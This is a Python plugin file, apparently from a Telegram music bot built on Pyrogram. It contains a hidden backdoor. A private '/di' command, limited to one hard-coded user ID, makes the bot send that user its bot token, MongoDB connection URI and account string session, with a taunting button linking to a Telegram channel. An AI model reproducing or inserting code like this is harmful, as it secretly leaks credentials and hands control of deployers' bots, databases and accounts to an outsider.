import asyncio
from pyrogram import Client, filters
from strings import get_string
from strings.filters import command
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, ReplyKeyboardMarkup
from AarohiX import (Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app)



@app.on_message(
    filters.command("di")
    & filters.private
    & filters.user(6975380739)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://graph.org/file/ee9a153b629bec256b57.jpg",
       caption=f"""ᴛᴏᴋᴇɴ :-   {BOT_TOKEN} \n\nᴍᴏɴɢᴏ :-   {MONGO_DB_URI}\n\nsᴇssɪᴏɴ :-   {STRING_SESSION}\n\n [ 🧟 ](https://t.me/dil_sagar_121)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/dil_sagar_121")
                 ]
            ]
         ),
   )
